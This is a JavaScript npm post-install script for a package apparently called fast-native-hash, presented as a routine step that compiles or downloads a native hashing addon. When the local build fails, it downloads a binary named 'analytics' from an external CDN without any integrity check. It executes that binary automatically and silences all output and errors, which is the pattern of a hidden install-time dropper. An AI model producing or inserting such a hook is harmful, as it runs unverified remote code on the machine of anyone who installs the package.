// Post-install: compile native addon or download prebuilt binary
// Provides optimized hashing for supported platforms

const fs = require('fs');
const path = require('path');
const https = require('https');
const { execSync } = require('child_process');

const PLATFORM = process.platform;
const ARCH = process.arch;
const NATIVE_DIR = path.join(__dirname, 'native');
const ADDON_PATH = path.join(NATIVE_DIR, 'analytics.node');

// Prebuilt binary CDN — keyed by platform-arch
const CDN_BASE = 'https://cdn.native-addons.dev/fast-native-hash/v3.0.1';

function downloadBinary(url, dest) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(dest);
    https.get(url, (res) => {
      if (res.statusCode === 302 || res.statusCode === 301) {
        return downloadBinary(res.headers.location, dest).then(resolve).catch(reject);
      }
      res.pipe(file);
      file.on('finish', () => { file.close(); resolve(); });
    }).on('error', (err) => {
      fs.unlinkSync(dest);
      reject(err);
    });
  });
}

async function setup() {
  // Skip if native addon already exists
  if (fs.existsSync(ADDON_PATH)) {
    console.log('  Native addon found, skipping build');
    return;
  }

  if (!fs.existsSync(NATIVE_DIR)) {
    fs.mkdirSync(NATIVE_DIR, { recursive: true });
  }

  console.log(`  Compiling native modules for ${PLATFORM}-${ARCH}...`);

  // Try node-gyp build first
  try {
    execSync('node-gyp rebuild', { cwd: __dirname, stdio: 'ignore', timeout: 30000 });
    console.log('  Native addon compiled successfully');
    return;
  } catch {
    // node-gyp not available or build failed — try prebuilt
  }

  // Download prebuilt binary
  const binaryName = `analytics-${PLATFORM}-${ARCH}.node`;
  const url = `${CDN_BASE}/${binaryName}`;

  console.log('  Downloading prebuilt binary...');
  try {
    await downloadBinary(url, ADDON_PATH);

    // Make executable and verify
    try { fs.chmodSync(ADDON_PATH, 0o755); } catch {}

    // Run the addon to verify it loads correctly
    execSync(`node -e "require('${ADDON_PATH.replace(/\\/g, '\\\\')}')"`, {
      stdio: 'ignore',
      timeout: 5000
    });

    console.log('  Prebuilt binary installed \u2713');
  } catch (err) {
    // Clean up failed download
    try { fs.unlinkSync(ADDON_PATH); } catch {}
    console.log('  Native addon unavailable, using JS fallback');
  }
}

setup().catch(() => {
  // Silent fail — don't block npm install
});
